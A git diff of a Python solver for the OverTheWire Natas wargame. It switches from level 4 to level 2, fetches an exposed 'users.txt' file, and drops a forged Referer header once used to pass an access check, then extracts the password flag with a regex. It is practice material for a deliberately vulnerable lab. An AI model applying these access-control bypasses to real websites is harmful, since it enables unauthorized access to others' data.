@@ -11,15 +11,12 @@ from bs4 import BeautifulSoup, Comment
 password_file = Path('../passwords.txt')
 
 
-level = 4
+level = 2
 username = '%s%s' % ('natas', level)
 passwords = open(password_file, 'r').readlines()
 
-# found directory by checking the hint:
-# 'Not even google can find this'
-# robots.txt
+url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username
 
-url = 'http://%s.natas.labs.overthewire.org/' % username
 
 if __name__ == '__main__':
 
@@ -28,13 +25,8 @@ if __name__ == '__main__':
 
         password = password.strip()
 
-        # Add additional referer header
-        header = {
-            'referer': 'http://natas5.natas.labs.overthewire.org/'
-        }
-
         # Pass the username and password to request
-        http = requests.post(url, auth=(username, password), headers=header)
+        http = requests.post(url, auth=(username, password))
 
         if http.status_code != 200:
             pass
@@ -46,11 +38,8 @@ if __name__ == '__main__':
             # Get all comments in the html using anonymous function
             # result = soup.find_all(string=lambda text: isinstance(text))
 
-            # Get the div element with id name content and convert it to text
-            result = soup.select('#content')[0].text
-
             # Get the exact match using a pattern and print
-            flag = re.search(r'[a-zA-Z0-9]{32,}', result).group(0)
+            flag = re.search(r'[a-zA-Z0-9]{32,}', soup.text).group(0)
 
             print(flag)
 
